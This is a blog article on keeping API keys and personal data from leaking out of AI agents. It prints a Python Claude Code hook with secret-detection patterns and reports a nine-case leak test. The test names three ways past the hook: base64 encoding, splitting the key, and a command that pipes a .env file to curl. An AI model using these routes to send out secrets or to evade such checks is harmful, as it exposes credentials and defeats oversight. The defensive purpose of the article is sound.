---
title: Can a key leak without breaking the policy? Told, checked, never given: three levels for secrets and personal data, and a hook we tested against nine leaks
date: 2026-10-20
author: Dinis Cruz
author_url: about/index.html
summary: One of our first customers asked a good question: could an API key, or someone's personal data, leak without breaking any Agent Behaviour Policy? The answer is yes, if the policy only lists what the agent can do. Sending an email is a capability; putting a key in it is content. So a policy that covers secrets needs rows about content too, such as disclosing a secret, and each row needs a barrier like any other. There are three levels. Told: a sentence in the prompt, kept by the model. Checked: a hook that scans every tool call, every tool result and the final answer. Never given: the agent asks for the action, and something out of its reach holds the key. We wrote the hook and tested it against nine ways a secret tries to leave. It denied three, redacted one, blocked one, let an ordinary command through, and missed three: a key encoded in base64, a key split in two, and a file of secrets piped straight out. Those three are why the best answer is still the third level: an agent that never sees the key cannot leak it.
version: v0.12.157
license: https://creativecommons.org/licenses/by/4.0/
tags: agents, agent-behaviour-policy, secrets, hooks, privacy, article
status: published
---

!shot lk-levels.webp | images/ | Nine ways a secret tries to leave, at three levels. Told leaves every case to the model. Checked is the measured result of the hook below: three denied, one redacted, one blocked, three missed. Never given leaves nothing to leak. | comparison

## In short {#in-short}

- **Yes, a key can leak without breaking a capability row.** Sending is allowed; the key is content.
- **So a policy needs content rows too.** Disclosing a secret, disclosing personal data.
- **Told: a sentence in the prompt.** The model keeps it, or does not.
- **Checked: a hook on every input and output.** Deterministic, and it has gaps.
- **Never given: the agent never holds the key.** It asks for the action instead.
- **We tested a hook against nine leaks.** It caught five and missed three.
- **The hook is below, CC BY 4.0.** Take it, tune it, run it.

## The question {#question}

One of our first customers said something that deserves a proper answer. What scared them was that an API key, or personal data, might leak without breaking any Agent Behaviour Policy. My first reaction was: how? The policy should include that behaviour. Their reply was that it might be their lack of knowledge of what a policy can do.

It is a good question, and the honest answer is that they are right about a policy that only lists capabilities. An [Agent Behaviour Policy](https://abp.sgit.ai/) writes down what an agent can do (the grant), what it may do (the mandate), the gap, and what stands in the way. If the agent may send email, the row says yes. A key pasted into the body of that email is not a different capability. It is the same action, with the wrong content.

## Capabilities and content {#content}

So a policy that covers secrets and personal data needs two more kinds of row. The first is about reach: can the agent read the key at all? In most deployments it can, because the key is in its environment, and the mandate almost never needs it to read the key, only to use it. That is excess grant, and it is exactly what a policy is for finding. The second is about content: `disclose.secret` with a mandate of no, and `disclose.personal_data` with a mandate of only to the person it is about.

A content row is like the investment advice row in [the Pellbridge agents](/articles/inside-the-pellbridge-agents.html): no system can block a sentence outright, so the barrier is a check, and a check can miss. That is why the question of where the rule is kept matters more here than anywhere.

## Three levels, and better names {#levels}

We have described the three levels before, in [governs, enforces, attests](/articles/governs-enforces-attests.html): in the prompt, in hooks, outside the agent. They need plainer names. I suggest these.

- **Told.** The prompt says: never print, send or store a key. The model decides whether to keep it, so in ABP terms it is an expectation.
- **Checked.** A hook in the agent's harness scans everything going out and coming in, and stops or redacts what matches. It is deterministic, which is a real level of guarantee, but it runs on the agent's own machine, and if the agent's account can change its configuration it is a setting.
- **Never given.** The key is held by something out of the agent's reach, a proxy or a host, which adds it to the request on the way out. The agent asks for the action, not the key. This is a boundary, and I still think it is the workflow to aim for.

## The hook {#hook}

Here is what Checked looks like in practice, for Claude Code. It runs on three hook events. On `PreToolUse` it scans the tool's input, and denies the call if it carries a secret, or names a variable that holds one: `$OPENAI_API_KEY` in a command never shows the value, but it still sends it. On `PostToolUse` it scans the tool's result and redacts secrets before the model sees them; Claude Code's documentation says to "intercept at `PreToolUse` for outbound tool inputs and `PostToolUse` for inbound tool results", and that `updatedToolOutput` "only changes what Claude sees. The tool has already run by the time the hook fires." On `Stop` it blocks a final answer that carries a secret or a card number; that hook receives the answer as `last_assistant_message`.

It matches common key formats with a regular expression, card numbers with the Luhn check, and, most usefully, the exact values of the session's own secrets, read from its environment, so a match on those is not a guess.

```python
#!/usr/bin/env python3
"""secret_guard: a Claude Code hook that keeps secrets and personal data out of tool calls.
PreToolUse: deny a call whose input carries a secret, or names a secret's variable.
PostToolUse: redact secrets from a tool's result before the model sees it.
Stop: block a final answer that carries a secret.  CC BY 4.0, newsroom.sgit.ai."""
import json, os, re, sys

PATTERNS = {
    "private key":      r"-----BEGIN [A-Z ]*PRIVATE[ ]KEY-----",
    "AWS access key":   r"\bAKIA[0-9A-Z]{16}\b",
    "GitHub token":     r"\bgh[pousr]_[A-Za-z0-9]{36,}\b",
    "Anthropic key":    r"\bsk-ant-[A-Za-z0-9_-]{20,}",
    "OpenAI-style key": r"\bsk-(?:proj-)?[A-Za-z0-9_-]{20,}",
    "Slack token":      r"\bxox[abprs]-[A-Za-z0-9-]{10,}",
    "JWT":              r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
}
SECRET_NAME = re.compile(r"(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)", re.I)
# The exact values of this session's secrets: a match on these is not a guess.
KNOWN = {k: v for k, v in os.environ.items() if SECRET_NAME.search(k) and len(v) >= 12}

def luhn(d):
    s, alt = 0, False
    for c in reversed(d):
        n = int(c) * (2 if alt else 1); s += n - 9 if n > 9 else n; alt = not alt
    return s % 10 == 0

def findings(text):
    out = [name for name, p in PATTERNS.items() if re.search(p, text)]
    out += ["card number" for m in re.finditer(r"\b(?:\d[ -]?){13,19}\b", text) if luhn(re.sub(r"\D", "", m.group()))][:1]
    out += ["the value of $" + k for k, v in KNOWN.items() if v in text]
    return out

def references(text):  # $OPENAI_API_KEY in a command: the value never appears, the variable does
    return ["a reference to $" + k for k in KNOWN if re.search(r"\$\{?" + re.escape(k) + r"\b", text)]

def redact(x):
    if isinstance(x, str):
        for p in PATTERNS.values(): x = re.sub(p, "[redacted]", x)
        for v in KNOWN.values(): x = x.replace(v, "[redacted]")
        return x
    if isinstance(x, dict): return {k: redact(v) for k, v in x.items()}
    if isinstance(x, list): return [redact(v) for v in x]
    return x

e = json.load(sys.stdin); ev = e.get("hook_event_name")
if ev == "PreToolUse":
    t = json.dumps(e.get("tool_input", {})); f = findings(t) + references(t)
    if f:
        print(json.dumps({"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "deny",
              "permissionDecisionReason": "secret_guard: this call carries " + ", ".join(f) + ". Ask for the action, not the secret."}}))
elif ev == "PostToolUse":
    r = e.get("tool_response")
    if findings(json.dumps(r)):
        print(json.dumps({"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": redact(r),
              "additionalContext": "secret_guard redacted a secret from this result."}}))
elif ev == "Stop":
    f = findings(e.get("last_assistant_message") or "")
    if f and not e.get("stop_hook_active"):
        print("secret_guard: your answer carries " + ", ".join(f) + ". Rewrite it without them.", file=sys.stderr); sys.exit(2)
```

To use it, save it as `.claude/hooks/secret_guard.py` and register it for `PreToolUse`, `PostToolUse` and `Stop` in `.claude/settings.json`. Tune the patterns to your own keys, and add your own personal data formats.

## Nine leaks, tested {#tested}

We ran it against nine cases, with fake keys made at random for the test, so no real key was involved.

- **Denied:** a command with a GitHub token in it; a command that sends a key by its variable name; a web fetch with the key's value in the URL.
- **Redacted:** a tool result that prints the key. The command ran, but the model saw `[redacted]`.
- **Blocked:** a final answer with a card number in it.
- **Allowed:** an ordinary `ls` and `git status`, as it should be.
- **Missed:** the key encoded in base64; the key split in two and joined by the command; and `cat .env | curl -d @- …`, a file of secrets piped straight out, where neither the value nor its name ever appears in the command.

The three misses are not bugs in this hook. They are what a check on the text of a command cannot see: an encoding, an assembly, or a file the hook never reads. More patterns would catch the first two some of the time. The third needs the hook to know which files hold secrets, and the agent can always find another way to read one.

## Never given {#never}

So the strongest answer is the third level. If the key is not in the agent's environment, none of the nine cases has anything to leak. The agent asks a proxy or a host to make the call, and the key is added on the way out, by something the agent cannot read.

We already work this way in places. In [the no-server studio](/articles/inside-the-no-server-studio.html), the vault host holds the model's key, caps the spend and never shows it to the page. In [handing secrets to agents](/articles/handing-secrets-to-agents.html), a secret is piped into the tool that needs it and never into the prompt. And the cloud sessions this newsroom runs in add some credentials through a proxy on the way out, while others are still in the environment; moving those out is on our own list.

Personal data is harder, because the agent often has to see it to do the job. There, Never given means minimisation: the agent gets a token or a reference instead of the card number, and only the system that needs the real value holds it. For what it does see, Checked is the right level, with every miss reported as a near miss.

## What to write in the policy {#policy}

For an agent that uses an API key, three rows, each with its barrier:

- **`read.secret.api_key`**: can it? If yes, the mandate is almost always no. Kept out of reach by giving the key to a proxy, not the agent.
- **`disclose.secret`**: mandate no. Checked by a hook on inputs, results and answers, knowing the session's own secret values.
- **`disclose.personal_data`**: only to the person it is about. Minimised where possible, checked where not.

Then the question our customer asked has a clear answer. A leak breaks a row; the row says what kept it; and the policy shows, before anything leaks, which rows are only told.

## What this does not claim {#limits}

- **The hook is an example.** Tested on nine cases, not on every way out.
- **Regular expressions miss things.** Encodings, splits and unknown formats.
- **A hook is only as strong as its configuration.** If the agent can change it, it is a setting.
- **Never given needs infrastructure.** A proxy or a host that holds the key.
- **The test used fake keys.** Made at random; no real secret was used.

## Where this comes from {#sources}

A conversation with one of our first customers, and a voice memo of 20 October 2026. Claude Code's [hooks reference](https://code.claude.com/docs/en/hooks), read the same day. The Agent Behaviour Policy at [abp.sgit.ai](https://abp.sgit.ai/). Related: [governs, enforces, attests](/articles/governs-enforces-attests.html), [are hooks the sweet spot?](/articles/are-hooks-the-sweet-spot.html), [handing secrets to agents](/articles/handing-secrets-to-agents.html), [secrets on public keys](/articles/secrets-on-public-keys.html), [inside the Pellbridge agents](/articles/inside-the-pellbridge-agents.html), [PKI everywhere](/articles/pki-everywhere.html). Written up and checked by this site's agent, newsroom.writer; the editorial responsibility is mine.
